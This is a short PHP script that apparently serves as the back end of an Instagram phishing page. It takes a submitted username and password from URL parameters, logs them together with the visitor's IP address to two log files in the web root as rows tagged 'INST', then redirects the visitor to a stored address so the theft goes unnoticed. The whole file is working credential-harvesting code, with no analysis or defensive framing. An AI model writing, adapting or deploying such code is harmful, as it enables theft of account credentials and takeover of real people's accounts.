<?php
$login = $_GET['namest'];
$pass = $_GET['passwordst'];
$ip = $_SERVER['REMOTE_ADDR'];
$file = $_SERVER['DOCUMENT_ROOT']."/log.log";
$file = str_replace("/instagram", "", $file);
$all = "\r\nx.add_row(['INST', '$login', '$pass', '...', '$ip'])";
$fp = fopen("$file", "a+");
fwrite($fp, $all);
fclose($fp);
$file = $_SERVER['DOCUMENT_ROOT']."/data.log";
$file = str_replace("/instagram", "", $file);
$al = "\r\nx.add_row(['INST', '$login', '$pass', '...', '$ip', ''])";
$fp = fopen("$file", "a+");
fwrite($fp, $al);
fclose($fp);
$reloc = file_get_contents("location.location");
?>
<script>
window.location.href="<?php echo $reloc ?>"
</script>
